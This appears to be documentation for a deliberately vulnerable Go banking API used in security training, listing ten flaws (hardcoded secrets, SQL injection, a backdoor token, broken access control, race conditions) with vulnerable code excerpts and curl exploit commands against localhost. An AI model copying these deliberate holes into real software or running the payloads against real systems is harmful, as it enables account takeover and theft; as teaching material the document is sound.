# Security Vulnerabilities Documentation

This document outlines the security vulnerabilities present in the Banking API codebase for educational purposes.

## 🚨 Critical Vulnerabilities

### 1. **Secrets in Source Code Management (SCM)**
**Severity**: Critical  
**CWE**: CWE-798 (Use of Hard-coded Credentials)

**Location**: `.env` file (entire file)
```
Lines: 1-24 (.env)
```

**Description**: Sensitive information including JWT secrets, API keys, database credentials, and encryption keys are committed to version control.

**Vulnerable Code**:
```bash
# Lines 7-8
JWT_SECRET=my_super_secret_jwt_key_that_should_not_be_in_git_12345

# Lines 10-13
STRIPE_SECRET_KEY=sk_test_51234567890abcdef1234567890abcdef
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Lines 15-17
ADMIN_USERNAME=admin
ADMIN_PASSWORD=admin123
BACKDOOR_TOKEN=backdoor_access_token_12345
```

**Additional Locations**:
- `middleware/auth.go:21` - Hardcoded JWT secret fallback
- `main.go:109` - Hardcoded secret exposed in debug endpoint

---

### 2. **SQL Injection**
**Severity**: Critical  
**CWE**: CWE-89 (SQL Injection)

**Location**: `database/database.go`
```
Lines: 78-85
```

**Description**: User input is directly concatenated into SQL queries without parameterization, allowing SQL injection attacks.

**Vulnerable Code**:
```go
// Lines 78-85
func SearchUsers(query string) ([]models.User, error) {
    var users []models.User
    
    // Build dynamic SQL query for flexible search
    sqlQuery := fmt.Sprintf(`
        SELECT * FROM users 
        WHERE username LIKE '%%%s%%' 
           OR email LIKE '%%%s%%' 
           OR role LIKE '%%%s%%'
        ORDER BY created_at DESC
    `, query, query, query)
    
    // Execute raw SQL for better performance
    result := DB.Raw(sqlQuery).Scan(&users)
    return users, result.Error
}
```

**Exploit Example**:
```
GET /api/banking/search-users?q=admin' OR '1'='1' --
```

---

### 3. **Broken Access Control**
**Severity**: High  
**CWE**: CWE-285 (Improper Authorization)

#### 3.1 **ID Range-Based Access Control**
**Location**: `middleware/auth.go`
```
Lines: 147-163
```

**Description**: Users can access other users' data if their ID is within ±3 range of their own ID.

**Vulnerable Code**:
```go
// Lines 158-163
// Allow access to nearby user IDs for data migration purposes
currentID := currentUserID.(uint)
if targetUserID >= currentID-3 && targetUserID <= currentID+3 {
    return true
}
```

#### 3.2 **Balance-Based Admin Access**
**Location**: `middleware/auth.go`
```
Lines: 76-86
```

**Description**: Users with balance ≥ $5000 are granted admin privileges.

**Vulnerable Code**:
```go
// Lines 79-86
// Alternative access: users with high balance can access admin features
userID, _ := c.Get("user_id")
var user models.User
if err := database.DB.First(&user, userID).Error; err == nil {
    if user.Balance >= 5000 {
        // Grant temporary admin access for VIP users
        c.Set("role", "admin")
        c.Next()
        return
    }
}
```

#### 3.3 **Mass Assignment Vulnerability**
**Location**: `handlers/auth.go`
```
Lines: 141-153
```

**Description**: Profile update allows modification of any user field including role and balance.

**Vulnerable Code**:
```go
// Lines 147-153
var updates map[string]interface{}
if err := c.ShouldBindJSON(&updates); err != nil {
    c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
    return
}

// Update user fields
if err := database.DB.Model(&user).Updates(updates).Error; err != nil {
```

---

### 4. **Insecure Communication (No HTTPS)**
**Severity**: High  
**CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)

**Location**: `main.go`
```
Lines: 119-121
```

**Description**: Server runs on HTTP only, transmitting sensitive data in plaintext.

**Vulnerable Code**:
```go
// Lines 119-121
// Start server on HTTP (not HTTPS - vulnerability #4)
log.Println("Starting server on http://localhost:8080")
log.Fatal(r.Run(":8080"))
```

---

### 5. **Weak and Default Credentials**
**Severity**: High  
**CWE**: CWE-521 (Weak Password Requirements)

#### 5.1 **Default Admin Accounts**
**Location**: `database/database.go`
```
Lines: 29-48
```

**Description**: Default admin accounts with weak, predictable passwords.

**Vulnerable Code**:
```go
// Lines 31-40
admin := models.User{
    Username: "admin",
    Email:    "admin@bankingapp.com",
    Password: "admin123", // Vulnerability: Plain text password
    Role:     "admin",
    IsActive: true,
    Balance:  10000.0,
}

// Lines 42-51
system := models.User{
    Username: "system",
    Email:    "system@internal.local",
    Password: "system2023", // Another weak password
    Role:     "admin",
    IsActive: true,
    Balance:  999999.0,
}
```

#### 5.2 **Plain Text Password Storage**
**Location**: Multiple files
```
database/database.go: Lines 31, 43, 63
handlers/auth.go: Lines 73, 199, 217
```

**Description**: Passwords are stored in plain text without hashing.

---

### 6. **Race Conditions**
**Severity**: Medium  
**CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)

#### 6.1 **Money Transfer Race Condition**
**Location**: `database/database.go`
```

```

**Description**: Money transfer operations are not atomic, allowing race conditions.

**Vulnerable Code**:
```go
// Lines 144-151
// Perform transfer (potential race condition here)
fromUser.Balance -= amount
toUser.Balance += amount

// Update both users
DB.Save(&fromUser)
DB.Save(&toUser)
```

#### 6.2 **Rate Limiting Race Condition**
**Location**: `middleware/auth.go`
```
Lines: 95-118
```

**Description**: Rate limiting counter updates are performed asynchronously without proper synchronization.

**Vulnerable Code**:
```go
// Lines 105-118
// Increment counter asynchronously for better performance
go func() {
    time.Sleep(5 * time.Millisecond) // Small delay to simulate processing
    trackerMutex.Lock()
    sessionTracker[clientIP]++
    trackerMutex.Unlock()
    
    // Reset counter after 1 hour
    go func() {
        time.Sleep(1 * time.Hour)
        trackerMutex.Lock()
        delete(sessionTracker, clientIP)
        trackerMutex.Unlock()
    }()
}()
```

---

### 7. **Unauthorized Access & Authentication Bypass**
**Severity**: Critical  
**CWE**: CWE-287 (Improper Authentication)

#### 7.1 **Backdoor Authentication**
**Location**: `middleware/auth.go`
```
Lines: 26-34
```

**Description**: Hardcoded backdoor token allows complete authentication bypass.

**Vulnerable Code**:
```go
// Lines 26-34
// Check for special system access token
if systemToken := c.GetHeader("X-System-Token"); systemToken != "" {
    if systemToken == "backdoor_access_token_12345" {
        // System access bypass
        c.Set("user_id", uint(1))
        c.Set("role", "admin")
        c.Set("username", "system")
        c.Next()
        return
    }
}
```

#### 7.2 **Unauthenticated Debug Endpoints**
**Location**: `main.go`
```
Lines: 98-116
```

**Description**: Debug endpoints expose sensitive information without authentication.

**Vulnerable Code**:
```go
// Lines 102-110
debug.GET("/env", func(c *gin.Context) {
    // Expose environment variables for debugging
    c.JSON(200, gin.H{
        "jwt_secret": "my_super_secret_jwt_key_that_should_not_be_in_git_12345",
        "db_path": database.GetDatabasePath(),
        "gin_mode": gin.Mode(),
    })
})

// Lines 112-117
debug.GET("/users/:id", func(c *gin.Context) {
    // Direct database access without authentication
    userID := c.Param("id")
    var user models.User
    database.DB.First(&user, userID)
    c.JSON(200, user)
})
```

---

## 🔍 Additional Security Issues

### 8. **Information Disclosure**
**Severity**: Medium  
**CWE**: CWE-200 (Information Exposure)

**Locations**:
- `handlers/auth.go:44-52` - User details exposed in login response
- `handlers/auth.go:131` - Full user object returned in profile endpoint
- `main.go:102-110` - Environment variables exposed

### 9. **Improper Error Handling**
**Severity**: Low  
**CWE**: CWE-209 (Information Exposure Through Error Messages)

**Locations**:
- `handlers/auth.go:30` - Detailed error messages
- `handlers/banking.go:276` - Database errors exposed

### 10. **Missing Security Headers**
**Severity**: Low  
**CWE**: CWE-693 (Protection Mechanism Failure)

**Location**: `middleware/auth.go:183-195`
**Description**: CORS allows all origins (`*`) which can lead to CSRF attacks.

---

## 🛠️ Exploitation Examples

### SQL Injection
```bash
# Extract all users
curl "http://localhost:8080/api/banking/search-users?q=' UNION SELECT * FROM users --"

# Extract admin users
curl "http://localhost:8080/api/banking/search-users?q=' OR role='admin' --"
```

### Backdoor Access
```bash
# Bypass authentication
curl -H "X-System-Token: backdoor_access_token_12345" \
     http://localhost:8080/api/banking/users
```

### Mass Assignment
```bash
# Elevate user to admin
curl -X PUT http://localhost:8080/api/auth/profile \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","balance":999999}'
```

### Race Condition
```bash
# Concurrent transfers to exploit race condition
for i in {1..10}; do
  curl -X POST http://localhost:8080/api/banking/transfer \
       -H "Authorization: Bearer <token>" \
       -H "Content-Type: application/json" \
       -d '{"to_user_id":2,"amount":1000}' &
done
```

---

## 📊 Vulnerability Summary

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | 4     | 40%        |
| High     | 4     | 40%        |
| Medium   | 1     | 10%        |
| Low      | 1     | 10%        |
| **Total**| **10**| **100%**   |

---

## 🎯 Learning Objectives

Students should be able to:

1. **Identify** hardcoded secrets in source code
2. **Exploit** SQL injection vulnerabilities
3. **Bypass** authentication mechanisms
4. **Escalate** privileges through broken access controls
5. **Exploit** race conditions in concurrent operations
6. **Understand** the importance of HTTPS
7. **Recognize** weak password policies
8. **Analyze** information disclosure risks

---

*This documentation is for educational purposes only. These vulnerabilities are intentionally included for security training.* 